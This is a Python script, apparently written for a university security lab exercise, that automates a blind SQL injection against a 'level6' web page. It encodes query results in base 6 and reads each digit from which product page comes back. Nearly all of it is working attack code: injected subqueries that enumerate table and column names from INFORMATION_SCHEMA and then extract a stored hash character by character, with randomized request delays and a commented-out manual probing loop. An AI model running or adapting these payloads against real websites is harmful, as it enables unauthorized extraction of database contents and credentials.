import pprint
import requests
import time
from random import randint
from baseconvert import BaseConverter
import string

#########################################################################
# BEGIN CONFIG
# ONLY MODIFY THE FOLLOWING FEW LINES!
# The table_list should be empty if not used (e.g. table_list1 = []).
#########################################################################
# table_list1 = ['c99c6a678baacc76eb6e0ao6u96cec9a']
# column_list1 = ['8767698d6fu86iddoc98760au699occd']
# column_list1 = ['8767698d6fU86IddOc98760aU699OCcd']
# column_list1 = ['8717198d6f5813dd4c98760a519942cd']
# table_list1 = ['c99C6a678baacc76eb6e0aO6U96cec9a']
table_list1 = ['c9921a178baacc76eb1e0a46596cec9a']
column_list1 = ['8717198d6f5813dd4c98760a519942cd']
# table_list1 = []
# column_list1 = []
capital_list1 = []

port = 2680


def do_delay():
    time.sleep(randint(1, 5)/200)
    # return
#########################################################################
# END CONFIG
#########################################################################


b = BaseConverter(input_base=6, output_base=36)

try:
    port
    print('Your port is {}'.format(port))
except NameError:
    print('Please enter your port')
    port = input()


def get_domain():
    return 'http://seclab1.win.tue.nl:' + str(port) + '/level6/index.php'


def value_in_between(web_page, identifier, deidentifier):
    start = web_page.find(identifier)
    start += len(identifier)
    end = web_page.find(deidentifier, start)
    # print(web_page[start:end])
    return web_page[start:end]


def define_product_id(web_page):
    if web_page.find('Harde schijf') > 1:
        return '1'
    elif web_page.find('DDR-2 RAM') > 1:
        return '2'
    elif web_page.find('Monitor') > 1:
        return '3'
    elif web_page.find('Processor') > 1:
        return '4'
    elif web_page.find('Multimedia PC') > 1:
        return '5'
    elif web_page.find('DIY-bonsai-kit') > 1:
        return '0'
    else:
        return '-1'


def do_sql_requestie(sql_code, print_url):
    do_delay()
    url1 = get_domain() + sql_code
    if print_url:
        print(url1)
    r1 = requests.get(url1)
    page_text1 = r1.text
    return define_product_id(page_text1)


def convert_base(base_value):
    base_array = b(base_value)
    base_result = ''
    for base_int in base_array:
        if int(base_int) < 10:
            base_result += str(base_int)
        else:
            base_result += string.ascii_lowercase[int(base_int)-10]
    # print(base_result)
    return base_result


if len(table_list1) == 0:
    total_database_table_string = ''
    for substring in range(1, 100):
        tables = 0
        base_6_value = ''
        firstResult = ''
        allResults = []
        for base_6_try in range(1, 3):
            firstResult = \
                do_sql_requestie('?id=(SELECT if(A.B=0,6,A.B) FROM (SELECT SUBSTRING(CONV(SUBSTRING('
                                 'concat_ws(\'z\',table_name, column_name),' + str(substring) + ',1),36,6),' + str(base_6_try) + ',1) AS B '
                                 'FROM INFORMATION_SCHEMA.COLUMNS WHERE char_length(table_name)=32 '
                                 'ORDER BY table_name DESC '
                                 'LIMIT 1 OFFSET ' + str(tables) + ') AS A)', False)
            # print(firstResult, end='')
            secondResult = \
                do_sql_requestie('?id=(SELECT if(A.B=0,6,A.B) FROM (SELECT SUBSTRING(CONV(SUBSTRING(' 
                                 'concat_ws(\'z\',table_name, column_name),' + str(substring) + ',1),36,6)-1,' + str(base_6_try) + ',1) AS B ' 
                                 'FROM INFORMATION_SCHEMA.COLUMNS WHERE char_length(table_name)=32 ' 
                                 'ORDER BY table_name DESC ' 
                                 'LIMIT 1 OFFSET ' + str(tables) + ') AS A)', False)
            # print(secondResult, end='')
            allResults.append(firstResult)
            allResults.append(secondResult)
            if firstResult == '-1':
                break
            else:
                base_6_value += str(firstResult)
        if firstResult == '-1':
            break
        if (allResults[0] != allResults[1] and allResults[2] == allResults[3]) and not allResults[1] == '-1':
            # print('Y', end='')
            base_36_value = convert_base(allResults[0])
        else:
            # print('N', end='')
            base_36_value = convert_base(base_6_value)

        if len(total_database_table_string) == 32:
            print('')
        else:
            print(base_36_value, end='', flush=True)
            # print(base_36_value)
        total_database_table_string += base_36_value

    table_list1.append(total_database_table_string[0:32])
    column_list1.append(total_database_table_string[33:65])

table_with_hash = table_list1[0]
column_with_hash = column_list1[0]
print('\nTable with hash is : {}'.format(table_with_hash))
print('Column with hash is : {}'.format(column_with_hash))

hash_string = ''
for substring in range(1, 100):
    tables = 0
    base_6_value = ''
    firstResult = ''
    allResults = []
    for base_6_try in range(1, 3):
        firstResult = \
            do_sql_requestie('?id=(SELECT if(A.B=0,6,A.B) FROM (SELECT SUBSTRING(CONV(SUBSTRING('
                             + str(column_with_hash) + ',' + str(substring) + ',1),36,6),' + str(base_6_try) +
                             ',1) AS B FROM ' + table_with_hash + ') AS A)', False)
        # print(firstResult, end='')
        secondResult = \
            do_sql_requestie('?id=(SELECT if(A.B=0,6,A.B) FROM (SELECT SUBSTRING(CONV(SUBSTRING('
                             + str(column_with_hash) + ',' + str(substring) + ',1),36,6)-1,' + str(base_6_try) +
                             ',1) AS B FROM ' + table_with_hash + ') AS A)', False)
        # print(secondResult, end='')
        allResults.append(firstResult)
        allResults.append(secondResult)
        if firstResult == '-1':
            break
        else:
            base_6_value += str(firstResult)
    if firstResult == '-1':
        break
    if (allResults[0] != allResults[1] and allResults[2] == allResults[3]) and not allResults[1] == '-1':
        print('Y', end='')
        base_36_value = convert_base(allResults[0])
    else:
        print('N', end='')
        base_36_value = convert_base(base_6_value)

    print(base_36_value, end='', flush=True)
    hash_string += base_36_value
print('\n\nFound hash value:{}'.format(hash_string))



#
# print('Test query:\n\n')
# true_table_hash = ''
# while 1 == 1:
#     product_id = ''
#     base_6_value = ''
#     print('Add another character:')
#     character_added = input()
#     true_table_hash += character_added
#     # true_table_hash = character_added + true_table_hash
#
#     for base_6_try in range(1, 2):
#         do_delay()
#         url = get_domain() + '?id=(SELECT if(A.B=0,6,A.B) FROM (SELECT SUBSTRING(CONV(SUBSTRING(' \
#                              'concat_ws(\'z\',table_name, column_name),' + str(len(true_table_hash)) + ',1),36,6),' + str(base_6_try) + ',1) AS B ' \
#                              'FROM INFORMATION_SCHEMA.COLUMNS WHERE char_length(table_name)=32 AND table_name LIKE \'' + true_table_hash + '%\' ' \
#                              'ORDER BY table_name DESC ' \
#                              'LIMIT 1 OFFSET ' + str(0) + ') AS A)'
#         print(url)
#         r = requests.get(url)
#         page_text = r.text
#         product_id = define_product_id(page_text)
#         if product_id == '-1':
#             print('Not found. Try another symbol.')
#             true_table_hash = true_table_hash[:-1]
#             break
#         else:
#             base_6_value += define_product_id(page_text)

# # Capital check
# do_delay()
# url = get_domain() + '?id=(SELECT if(A.B=0, 1, 2) FROM (SELECT SUBSTRING(' \
#                      'concat_ws(\'z\',table_name, column_name),' + str(substring) + ',1) AS B ' \
#                      'FROM INFORMATION_SCHEMA.COLUMNS WHERE char_length(table_name)=32 ' \
#                      'ORDER BY table_name DESC ' \
#                      'LIMIT 1 OFFSET ' + str(tables) + ') AS A ' \
#                      'WHERE CAST(SUBSTRING(A.B, 1, 1) AS BINARY) = UPPER(SUBSTRING(A.B, 1, 1)))'
# r = requests.get(url)
# page_text = r.text
# product_id = define_product_id(page_text)
# if product_id == '-1':
#     capital_list1.append(False)
# else:
#     capital_list1.append(True)
#     base_36_value = base_36_value.upper()


